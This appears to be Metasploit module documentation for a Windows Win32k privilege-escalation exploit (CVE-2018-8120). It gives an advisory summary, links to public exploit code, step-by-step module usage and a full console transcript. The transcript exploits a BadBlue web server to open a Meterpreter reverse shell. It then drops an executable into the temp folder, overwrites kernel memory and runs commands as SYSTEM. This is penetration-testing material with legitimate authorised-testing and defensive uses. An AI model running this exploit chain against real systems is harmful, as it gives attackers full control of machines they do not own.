## Overview

An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory. An attacker who successfully exploited this vulnerability could run arbitrary code in kernel mode. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system.

The update addresses this vulnerability by correcting how Win32k handles objects in memory.

* https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120
* http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html
* https://github.com/bigric3/cve-2018-8120
* https://github.com/unamer/CVE-2018-8120

## Verification steps

1. Start `msfconsole`
2. Get a session
3. `use post/windows/escalate/ms18_8120_win32k_privsec`
4. `set SESSION [SESSION]`
5. `set POCCMD whoami`
6. `run`

## Usage

```
msf exploit(windows/http/badblue_passthru) > run

[*] Started reverse TCP handler on 192.168.1.102:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (179779 bytes) to 192.168.1.105
[*] Meterpreter session 1 opened (192.168.1.102:4444 -> 192.168.1.105:49214) at 2018-09-18 14:52:55 +0530

meterpreter > getuid 
Server username: zero-PC\low
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(windows/http/badblue_passthru) > use post/windows/escalate/ms18_8120_win32k_privsec 
msf post(windows/escalate/ms18_8120_win32k_privsec) > set SESSION 1
SESSION => 1
msf post(windows/escalate/ms18_8120_win32k_privsec) > set POCCMD whoami
POCCMD => whoami
msf post(windows/escalate/ms18_8120_win32k_privsec) > run

[!] SESSION may not be compatible with this module.
[*] exe name is: f4MZlRO4LZ.exe
[*] Reading Payload from file /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.17.11/data/exploits/CVE-2018-0824/CVE-2018-8120.exe
[!] writing to %TEMP%
[+] Persistent Script written to C:\Users\LOW~1.ZER\AppData\Local\Temp\f4MZlRO4LZ.exe
[*] Starting module..

[*] Location of CVE-2018-8120.exe is: C:\Users\LOW~1.ZER\AppData\Local\Temp\f4MZlRO4LZ.exe
[*] Executing command : C:\Users\LOW~1.ZER\AppData\Local\Temp\f4MZlRO4LZ.exe whoami
CVE-2018-8120 exploit by @unamer(https://github.com/unamer)
[+] Detected kernel ntoskrnl.exe
[+] Get manager at fffff900c1a4e720,worker at fffff900c1a52060
[+] Triggering vulnerability...
[+] Overwriting...fffff80002a35c38
[+] Elevating privilege...
[+] Cleaning up...
[+] Trying to execute whoami as SYSTEM...
[+] Process created with pid 3516!
nt authority\system

[*] Post module execution completed
msf post(windows/escalate/ms18_8120_win32k_privsec) >
```
